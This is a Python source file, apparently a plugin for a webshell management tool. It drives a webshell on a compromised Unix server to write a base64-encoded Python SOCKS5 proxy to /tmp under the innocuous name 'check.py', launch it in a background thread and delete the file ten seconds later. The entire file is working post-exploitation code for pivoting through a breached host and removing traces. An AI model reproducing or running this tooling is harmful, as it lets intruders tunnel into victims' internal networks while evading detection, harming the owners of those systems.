from libs.config import alias, color
from libs.myapp import send, delay_send, is_windows, has_env, get_system_code, base64_encode
from libs.functions.webshell_plugins.old_socks import *
from threading import Thread
from time import sleep


def get_python(port):
    return get_php_old_socks() % port


@alias(True, _type="OTHER")
def run(port: int = 8888):
    """
    old_socks

    will be deprecated soon, please use command socks instead.

    (Only for *unix) Run a socks5 server on the target system by python.

    eg: socks {port=8888}
    """
    if (is_windows()):
        print(color.red("Target system isn't *unix"))
        return
    flag = has_env("python")
    if flag:
        python = get_python(port)
        pyname = "check.py"
        res = send(
            f"print(file_put_contents('/tmp/{pyname}', base64_decode(\"{base64_encode(python)}\")));")
        if (not res):
            return
        text = res.r_text.strip()
        if not len(text):
            print(color.red("Failed to write file in /tmp directory."))
            return
        t = Thread(
            target=send, args=(
                get_system_code(f"python /tmp/{pyname}"),))
        t.setDaemon(True)
        t.start()
        t2 = Thread(
            target=delay_send, args=(10.0, f"unlink('/tmp/{pyname}');",)
        )
        t2.setDaemon(True)
        t2.start()
        sleep(1)
        if (t.is_alive()):
            print(
                f"\nStart socks5 server listen on {port} {color.green('success')}.\n")
        else:
            print(f"\nStart socks5 server {color.red('error')}.\n")
    else:
        print(
            color.red(
                "The target host does not exist or cannot be found in the python environment."
            )
        )
